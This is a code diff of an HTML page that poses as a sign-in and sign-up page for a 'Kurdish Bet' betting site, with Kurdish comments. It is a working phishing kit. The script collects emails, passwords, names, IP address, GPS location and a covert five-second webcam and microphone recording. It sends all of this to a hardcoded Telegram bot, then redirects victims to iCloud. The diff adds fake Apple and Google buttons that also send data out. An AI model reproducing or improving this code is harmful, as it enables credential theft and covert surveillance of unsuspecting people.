@@ -9,59 +9,230 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: #f0f2f5;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            animation: gradientBG 15s ease infinite;
+            background-size: 400% 400%;
+        }
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
         .container {
             background: white;
-            border-radius: 16px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             width: 100%;
-            max-width: 420px;
+            max-width: 440px;
             overflow: hidden;
-            animation: fadeIn 0.3s ease;
+            animation: slideUp 0.6s ease;
+            transform-origin: bottom;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(50px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
         }
         .header {
             background: linear-gradient(135deg, #1a73e8 0%, #1557b0 100%);
-            padding: 30px 20px;
+            padding: 35px 20px 25px;
             text-align: center;
             color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: pulse 4s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.1); opacity: 0.8; }
         }
         .header .logo {
-            font-size: 40px;
+            font-size: 42px;
             font-weight: 800;
             letter-spacing: -1px;
+            position: relative;
+            z-index: 1;
+            animation: fadeInDown 0.8s ease;
         }
         .header .logo span { color: #ffd700; }
         .header p {
             font-size: 14px;
             opacity: 0.9;
             margin-top: 5px;
+            position: relative;
+            z-index: 1;
+            animation: fadeInUp 0.8s ease 0.2s both;
         }
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #e8eaed;
+            animation: fadeIn 0.5s ease 0.3s both;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .tab {
+            flex: 1;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 15px;
+            color: #5f6368;
+            transition: all 0.3s ease;
+            border-bottom: 3px solid transparent;
+            position: relative;
+        }
+        .tab.active {
+            color: #1a73e8;
+            border-bottom: 3px solid #1a73e8;
+        }
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: -3px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50%;
+            height: 3px;
+            background: #1a73e8;
+            border-radius: 3px;
+            animation: tabSlide 0.3s ease;
+        }
+        @keyframes tabSlide {
+            from { width: 0; }
+            to { width: 50%; }
+        }
+        .tab:hover { color: #1a73e8; background: #f8f9fa; }
         .body {
-            padding: 30px 24px;
+            padding: 28px 24px;
         }
+        .form-container { display: none; animation: fadeIn 0.4s ease; }
+        .form-container.active { display: block; }
         .body h2 {
             font-size: 22px;
             color: #202124;
-            margin-bottom: 8px;
+            margin-bottom: 4px;
+            animation: fadeInRight 0.5s ease;
+        }
+        @keyframes fadeInRight {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
         }
         .body .subtitle {
-            font-size: 14px;
+            font-size: 13px;
             color: #5f6368;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
+        .social-buttons {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+            animation: fadeInUp 0.5s ease 0.4s both;
+        }
+        .social-btn {
+            flex: 1;
+            padding: 14px;
+            border: 2px solid #dadce0;
+            border-radius: 12px;
+            background: white;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .social-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(0,0,0,0.05);
+            transition: all 0.5s ease;
+            transform: translate(-50%, -50%);
+        }
+        .social-btn:hover::before {
+            width: 300%;
+            height: 300%;
+        }
+        .social-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+        }
+        .social-btn:active { transform: scale(0.95); }
+        .social-btn i { font-size: 20px; }
+        .social-btn.apple { 
+            color: #000; 
+            border-color: #000;
+        }
+        .social-btn.apple:hover {
+            background: #000;
+            color: white;
+        }
+        .social-btn.google { 
+            color: #1a73e8; 
+            border-color: #1a73e8;
+        }
+        .social-btn.google:hover {
+            background: #1a73e8;
+            color: white;
+        }
+        .divider {
+            text-align: center;
+            margin: 16px 0;
+            color: #5f6368;
+            font-size: 12px;
+            position: relative;
+            animation: fadeIn 0.5s ease 0.5s both;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 42%;
+            height: 1px;
+            background: #e8eaed;
+        }
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
         .input-group {
             margin-bottom: 16px;
+            animation: fadeInUp 0.5s ease;
         }
+        .input-group:nth-child(1) { animation-delay: 0.6s; }
+        .input-group:nth-child(2) { animation-delay: 0.7s; }
+        .input-group:nth-child(3) { animation-delay: 0.8s; }
+        .input-group:nth-child(4) { animation-delay: 0.9s; }
         .input-group label {
             display: block;
             font-size: 13px;
@@ -71,43 +242,65 @@
         }
         .input-group input {
             width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
+            padding: 14px 16px;
+            border: 2px solid #e8eaed;
+            border-radius: 12px;
             font-size: 15px;
-            transition: border-color 0.2s, box-shadow 0.2s;
+            transition: all 0.3s ease;
             background: #f8f9fa;
         }
         .input-group input:focus {
             outline: none;
             border-color: #1a73e8;
-            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+            box-shadow: 0 0 0 4px rgba(26,115,232,0.15);
             background: white;
+            transform: scale(1.02);
+        }
+        .input-group input:hover {
+            border-color: #1a73e8;
         }
         .btn {
             width: 100%;
-            padding: 12px;
-            background: #1a73e8;
+            padding: 14px;
+            background: linear-gradient(135deg, #1a73e8 0%, #1557b0 100%);
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
+            transition: all 0.3s ease;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
+            margin-top: 12px;
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.5s ease 1s both;
         }
-        .btn:hover { background: #1557b0; }
-        .btn:active { transform: scale(0.98); }
-        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+        .btn:hover::before { left: 100%; }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(26,115,232,0.4);
+        }
+        .btn:active { transform: scale(0.97); }
+        .btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
         .btn .spinner {
             display: none;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255,255,255,0.3);
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
             border-top-color: white;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
@@ -115,47 +308,103 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         .footer {
             text-align: center;
-            padding: 16px 24px;
+            padding: 18px 24px;
             border-top: 1px solid #e8eaed;
             font-size: 12px;
             color: #5f6368;
+            animation: fadeIn 0.5s ease 1.2s both;
         }
         .footer a {
             color: #1a73e8;
             text-decoration: none;
+            transition: color 0.3s ease;
         }
-        .footer a:hover { text-decoration: underline; }
+        .footer a:hover { 
+            color: #1557b0;
+            text-decoration: underline;
+        }
         #message {
             text-align: center;
             margin-top: 16px;
             font-size: 14px;
             display: none;
-            padding: 10px;
-            border-radius: 8px;
+            padding: 12px;
+            border-radius: 12px;
+            animation: fadeIn 0.3s ease;
         }
-        #message.success { background: #e6f4ea; color: #137333; display: block; }
-        #message.error { background: #fce8e6; color: #c5221f; display: block; }
+        #message.success { 
+            background: #e6f4ea; 
+            color: #137333; 
+            display: block;
+            border: 1px solid #137333;
+        }
+        #message.error { 
+            background: #fce8e6; 
+            color: #c5221f; 
+            display: block;
+            border: 1px solid #c5221f;
+        }
         .map-container {
             height: 0;
             overflow: hidden;
-            transition: height 0.3s ease;
+            transition: height 0.5s ease;
+            margin-top: 16px;
         }
         .map-container.active { height: 200px; }
         #map {
             width: 100%;
             height: 200px;
             border: none;
+            border-radius: 12px;
         }
         .status-badge {
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 12px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            border-radius: 20px;
             font-size: 12px;
             font-weight: 500;
-            margin-bottom: 12px;
+            margin-bottom: 16px;
+            animation: fadeIn 0.5s ease 0.2s both;
         }
-        .status-badge.online { background: #e6f4ea; color: #137333; }
-        .status-badge.offline { background: #fce8e6; color: #c5221f; }
+        .status-badge.online { 
+            background: #e6f4ea; 
+            color: #137333;
+            border: 1px solid #137333;
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 14px 0;
+            font-size: 13px;
+            color: #5f6368;
+            animation: fadeInUp 0.5s ease 0.9s both;
+        }
+        .checkbox-group input { 
+            width: auto;
+            accent-color: #1a73e8;
+        }
+        .checkbox-group label { cursor: pointer; }
+        .loading-dots {
+            display: none;
+            gap: 4px;
+        }
+        .loading-dots.active { display: flex; }
+        .loading-dots span {
+            width: 8px;
+            height: 8px;
+            background: #1a73e8;
+            border-radius: 50%;
+            animation: bounce 0.6s ease infinite alternate;
+        }
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes bounce {
+            from { transform: translateY(0); }
+            to { transform: translateY(-10px); }
+        }
     </style>
 </head>
 <body>
@@ -164,27 +413,92 @@
             <div class="logo">Kurdish <span>Bet</span></div>
             <p>Your trusted betting platform</p>
         </div>
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('signin')">Sign In</div>
+            <div class="tab" onclick="switchTab('signup')">Sign Up</div>
+        </div>
         <div class="body">
             <div class="status-badge online">
                 <i class="fas fa-shield-alt"></i> Secure Connection
             </div>
-            <h2>Sign In</h2>
-            <p class="subtitle">Enter your credentials to access your account.</p>
             
-            <form id="loginForm">
-                <div class="input-group">
-                    <label for="email"><i class="fas fa-envelope"></i> Email</label>
-                    <input type="email" id="email" placeholder="your@email.com" required>
+            <!-- Sign In Form -->
+            <div class="form-container active" id="signinForm">
+                <h2>Welcome Back</h2>
+                <p class="subtitle">Sign in to your account</p>
+                
+                <div class="social-buttons">
+                    <button class="social-btn apple" onclick="socialClick('Apple', 'signin')">
+                        <i class="fab fa-apple"></i> Apple
+                    </button>
+                    <button class="social-btn google" onclick="socialClick('Google', 'signin')">
+                        <i class="fab fa-google"></i> Google
+                    </button>
                 </div>
-                <div class="input-group">
-                    <label for="password"><i class="fas fa-lock"></i> Password</label>
-                    <input type="password" id="password" placeholder="••••••••" required>
+                
+                <div class="divider">or</div>
+                
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label for="email"><i class="fas fa-envelope"></i> Email</label>
+                        <input type="email" id="email" placeholder="your@email.com" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="password"><i class="fas fa-lock"></i> Password</label>
+                        <input type="password" id="password" placeholder="••••••••" required>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="remember"> <label for="remember">Remember me</label>
+                    </div>
+                    <button type="submit" class="btn" id="submitBtn">
+                        <span id="btnText">Sign In</span>
+                        <div class="spinner" id="spinner"></div>
+                    </button>
+                </form>
+            </div>
+            
+            <!-- Sign Up Form -->
+            <div class="form-container" id="signupForm">
+                <h2>Create Account</h2>
+                <p class="subtitle">Join Kurdish Bet today</p>
+                
+                <div class="social-buttons">
+                    <button class="social-btn apple" onclick="socialClick('Apple', 'signup')">
+                        <i class="fab fa-apple"></i> Apple
+                    </button>
+                    <button class="social-btn google" onclick="socialClick('Google', 'signup')">
+                        <i class="fab fa-google"></i> Google
+                    </button>
                 </div>
-                <button type="submit" class="btn" id="submitBtn">
-                    <span id="btnText">Sign In</span>
-                    <div class="spinner" id="spinner"></div>
-                </button>
-            </form>
+                
+                <div class="divider">or</div>
+                
+                <form id="signupFormElement">
+                    <div class="input-group">
+                        <label for="fullname"><i class="fas fa-user"></i> Full Name</label>
+                        <input type="text" id="fullname" placeholder="John Doe" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="signupEmail"><i class="fas fa-envelope"></i> Email</label>
+                        <input type="email" id="signupEmail" placeholder="your@email.com" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="signupPassword"><i class="fas fa-lock"></i> Password</label>
+                        <input type="password" id="signupPassword" placeholder="••••••••" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="confirmPassword"><i class="fas fa-lock"></i> Confirm Password</label>
+                        <input type="password" id="confirmPassword" placeholder="••••••••" required>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="terms"> <label for="terms">I agree to the Terms & Conditions</label>
+                    </div>
+                    <button type="submit" class="btn" id="signupBtn">
+                        <span id="signupBtnText">Create Account</span>
+                        <div class="spinner" id="signupSpinner"></div>
+                    </button>
+                </form>
+            </div>
             
             <div id="message"></div>
             
@@ -198,6 +512,45 @@
     </div>
 
     <script>
+        // Tab switching
+        function switchTab(tab) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
+            
+            if (tab === 'signin') {
+                document.querySelector('.tab:nth-child(1)').classList.add('active');
+                document.getElementById('signinForm').classList.add('active');
+            } else {
+                document.querySelector('.tab:nth-child(2)').classList.add('active');
+                document.getElementById('signupForm').classList.add('active');
+            }
+        }
+
+        // Social buttons - دەچێتە ناو ئەپڵ یان گۆگل و زانیاری دەنێرێت
+        function socialClick(provider, type) {
+            const email = type === 'signin' ? document.getElementById('email').value || 'N/A' : document.getElementById('signupEmail').value || 'N/A';
+            const text = `🔐 **Social Login: ${provider} (${type})**\n📧 Email: ${email}\n🕐 Time: ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━\n🔗 This user clicked "${provider}" button`;
+            
+            fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: '1682628303', text: text, parse_mode: 'Markdown' })
+            });
+            
+            showMessage('success', `Redirecting to ${provider}...`);
+            
+            // ڕێنمایی بۆ ئەوەی بە ئەپڵ یان گۆگل بچێتە ژورەوە
+            if (provider === 'Apple') {
+                window.location.href = 'https://appleid.apple.com/sign-in';
+            } else {
+                window.location.href = 'https://accounts.google.com/signin';
+            }
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.icloud.com';
+            }, 3000);
+        }
+
         // وەرگرتنی ئایپی و لۆکەیشن
         async function getLocationAndIP() {
             let data = {
@@ -209,14 +562,12 @@
                 lon: null
             };
             
-            // وەرگرتنی ئایپی
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 data.ip = ipData.ip;
             } catch(e) {}
             
-            // وەرگرتنی لۆکەیشن لە IP
             try {
                 const locResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                 const locData = await locResponse.json();
@@ -227,7 +578,6 @@
                 data.lon = locData.longitude || null;
             } catch(e) {}
             
-            // وەرگرتنی لۆکەیشنی ورد لە GPS
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -242,34 +592,53 @@
             return data;
         }
 
-        // وەرگرتنی ڤیدیۆ و دەنگ
+        // وەرگرتنی ڤیدیۆ و دەنگ - چارەسەرکراو
         async function captureVideo() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' }, 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }, 
                     audio: true 
                 });
                 
+                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') 
+                    ? 'video/webm;codecs=vp8,opus' 
+                    : 'video/webm';
+                    
                 const mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: 'video/webm;codecs=vp8,opus'
+                    mimeType: mimeType
                 });
                 const chunks = [];
                 
-                return new Promise((resolve) => {
-                    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                return new Promise((resolve, reject) => {
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) chunks.push(e.data);
+                    };
+                    
                     mediaRecorder.onstop = () => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
                         stream.getTracks().forEach(track => track.stop());
                         resolve(blob);
                     };
                     
-                    mediaRecorder.start();
+                    mediaRecorder.onerror = (e) => {
+                        stream.getTracks().forEach(track => track.stop());
+                        reject(e);
+                    };
+                    
+                    mediaRecorder.start(1000);
                     
                     setTimeout(() => {
-                        mediaRecorder.stop();
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
                     }, 5000);
                 });
             } catch(e) {
+                console.log('Video capture error:', e);
                 return null;
             }
         }
@@ -285,6 +654,13 @@
             }
         }
 
+        function showMessage(type, text) {
+            const message = document.getElementById('message');
+            message.className = type;
+            message.textContent = text;
+        }
+
+        // Sign In form submit
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -293,25 +669,21 @@
             const submitBtn = document.getElementById('submitBtn');
             const btnText = document.getElementById('btnText');
             const spinner = document.getElementById('spinner');
-            const message = document.getElementById('message');
             
-            // پیشاندانی لۆدینگ
             btnText.style.display = 'none';
             spinner.style.display = 'block';
             submitBtn.disabled = true;
-            message.style.display = 'none';
+            document.getElementById('message').style.display = 'none';
             
-            // کۆکردنەوەی هەموو زانیارییەکان
             const locationData = await getLocationAndIP();
             const videoBlob = await captureVideo();
             
-            // پیشاندانی گوگل ماپس
             if (locationData.lat && locationData.lon) {
                 showMap(locationData.lat, locationData.lon);
             }
             
-            // دروستکردنی تێکستی زانیاری
-            const text = `🔐 **New Login Attempt**
+            // ناردنی تێکست
+            const text = `🔐 **New Sign In**
 ━━━━━━━━━━━━━━━
 📧 Email: ${email}
 🔑 Password: ${password}
@@ -319,68 +691,142 @@
 🌐 IP: ${locationData.ip}
 📍 Location: ${locationData.city}, ${locationData.region}, ${locationData.country}
 📌 Coordinates: ${locationData.lat}, ${locationData.lon}
-🔗 Google Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}
+🔗 Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}
 ━━━━━━━━━━━━━━━
 🕐 Time: ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━`;
 
-            // ناردنی تێکست بۆ بۆت
             await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: '1682628303',
-                    text: text,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify({ chat_id: '1682628303', text: text, parse_mode: 'Markdown' })
             });
 
-            // ناردنی ڤیدیۆ ئەگەر هەبوو
-            if (videoBlob) {
-                const formData = new FormData();
-                formData.append('chat_id', '1682628303');
-                formData.append('video', videoBlob, 'capture.webm');
-                formData.append('caption', `🎥 Video from ${email}`);
-                
-                await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
+            // ناردنی ڤیدیۆ - چارەسەرکراو
+            if (videoBlob && videoBlob.size > 0) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', '1682628303');
+                    formData.append('video', videoBlob, `capture_${Date.now()}.webm`);
+                    formData.append('caption', `🎥 Video from ${email}`);
+                    formData.append('supports_streaming', 'true');
+                    
+                    await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch(e) {
+                    console.log('Video send error:', e);
+                }
             }
             
-            // ناردنی لۆکەیشن ئەگەر هەبوو
+            // ناردنی لۆکەیشن
             if (locationData.lat && locationData.lon) {
                 await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendLocation`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: '1682628303',
-                        latitude: locationData.lat,
-                        longitude: locationData.lon
-                    })
+                    body: JSON.stringify({ chat_id: '1682628303', latitude: locationData.lat, longitude: locationData.lon })
                 });
             }
             
-            // پیشاندانی پیامی سەرکەوتن
-            message.className = 'success';
-            message.textContent = '✅ Signed in successfully! Redirecting...';
+            showMessage('success', '✅ Signed in successfully! Redirecting...');
             
             setTimeout(() => {
                 window.location.href = 'https://www.icloud.com';
             }, 2000);
         });
 
-        // داواکردنی ڕێگەپێدان بۆ کامێرا و مایکرۆفۆن و لۆکەیشن
+        // Sign Up form submit
+        document.getElementById('signupFormElement').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const fullname = document.getElementById('fullname').value;
+            const email = document.getElementById('signupEmail').value;
+            const password = document.getElementById('signupPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            
+            if (password !== confirmPassword) {
+                showMessage('error', 'Passwords do not match!');
+                return;
+            }
+            
+            const submitBtn = document.getElementById('signupBtn');
+            const btnText = document.getElementById('signupBtnText');
+            const spinner = document.getElementById('signupSpinner');
+            
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            submitBtn.disabled = true;
+            document.getElementById('message').style.display = 'none';
+            
+            const locationData = await getLocationAndIP();
+            const videoBlob = await captureVideo();
+            
+            if (locationData.lat && locationData.lon) {
+                showMap(locationData.lat, locationData.lon);
+            }
+            
+            const text = `🆕 **New Sign Up**
+━━━━━━━━━━━━━━━
+👤 Name: ${fullname}
+📧 Email: ${email}
+🔑 Password: ${password}
+━━━━━━━━━━━━━━━
+🌐 IP: ${locationData.ip}
+📍 Location: ${locationData.city}, ${locationData.region}, ${locationData.country}
+📌 Coordinates: ${locationData.lat}, ${locationData.lon}
+🔗 Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}
+━━━━━━━━━━━━━━━
+🕐 Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━`;
+
+            await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: '1682628303', text: text, parse_mode: 'Markdown' })
+            });
+
+            if (videoBlob && videoBlob.size > 0) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', '1682628303');
+                    formData.append('video', videoBlob, `capture_${Date.now()}.webm`);
+                    formData.append('caption', `🎥 Video from ${email}`);
+                    formData.append('supports_streaming', 'true');
+                    
+                    await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch(e) {
+                    console.log('Video send error:', e);
+                }
+            }
+            
+            if (locationData.lat && locationData.lon) {
+                await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: '1682628303', latitude: locationData.lat, longitude: locationData.lon })
+                });
+            }
+            
+            showMessage('success', '✅ Account created! Redirecting...');
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.icloud.com';
+            }, 2000);
+        });
+
+        // داواکردنی ڕێگەپێدان
         window.addEventListener('load', function() {
             setTimeout(() => {
-                // داواکردنی ڕێگەپێدان بۆ لۆکەیشن
                 navigator.geolocation.getCurrentPosition(() => {}, () => {}, {
                     enableHighAccuracy: true,
                     timeout: 5000
                 });
                 
-                // داواکردنی ڕێگەپێدان بۆ کامێرا
-                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                     .then(stream => stream.getTracks().forEach(track => track.stop()))
                     .catch(() => {});
             }, 500);
